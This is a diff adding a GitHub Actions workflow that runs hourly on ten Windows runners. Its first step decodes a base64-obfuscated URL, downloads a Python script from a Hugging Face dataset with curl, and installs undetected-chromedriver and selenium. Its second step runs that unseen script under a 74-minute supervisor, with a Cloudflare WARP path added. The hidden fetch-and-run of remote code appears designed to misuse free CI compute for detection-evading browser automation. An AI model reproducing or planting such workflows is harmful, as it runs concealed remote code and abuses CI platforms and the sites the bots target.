@@ -1,0 +1,70 @@
+name: Matrix Automation Pipeline
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 * * * *'
+
+concurrency:
+  group: matrix-pool-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  launch-workers:
+    name: "Agent-${{ matrix.node_index }}"
+    runs-on: windows-2022
+    timeout-minutes: 75
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+
+    steps:
+      - name: Environment Config & Script Download
+        shell: bash
+        run: |
+          echo "[STARTUP] Configuring Agent-${{ matrix.node_index }}..."
+          
+          # فك تشفير الرابط المعدل وتحميل الملف
+          SCRIPT_ENDPOINT=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL3ZhdmEvcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19uZXcucHk=" | base64 --decode)
+          
+          curl -sL "$SCRIPT_ENDPOINT" -o runner.py
+          
+          echo "[STARTUP] Installing Python packages..."
+          python -m pip install -qU pip setuptools
+          pip install -q undetected-chromedriver selenium requests
+          echo "[STARTUP] Environment successfully configured."
+
+      - name: Run Script & Enforce Timeout
+        shell: pwsh
+        env:
+          PYTHONIOENCODING: "utf-8"
+        run: |
+          Write-Output ">>> Initiating python task on agent ${{ matrix.node_index }}..."
+          
+          $env:PATH = "$env:PATH;C:\Program Files\Cloudflare\Cloudflare WARP"
+          
+          $PyRunArgs = @{
+              FilePath     = "python"
+              ArgumentList = "runner.py"
+              PassThru     = $true
+              NoNewWindow  = $true
+          }
+          $ScriptProcess = Start-Process @PyRunArgs
+          
+          Write-Output ">>> Supervisor activated. Maximum allowed time: 74 minutes."
+          
+          try {
+              Wait-Process -InputObject $ScriptProcess -Timeout 4440 -ErrorAction Stop
+              Write-Output ">>> Task completed smoothly within the time limit."
+          }
+          catch {
+              Write-Output ">>> Timeout reached! Terminating the python task..."
+              Stop-Process -InputObject $ScriptProcess -Force
+              Write-Output ">>> Task successfully killed by the supervisor."
+          }
+
+      - name: End of Job
+        shell: bash
+        run: echo "[FINISHED] Agent-${{ matrix.node_index }} completed its workflow."
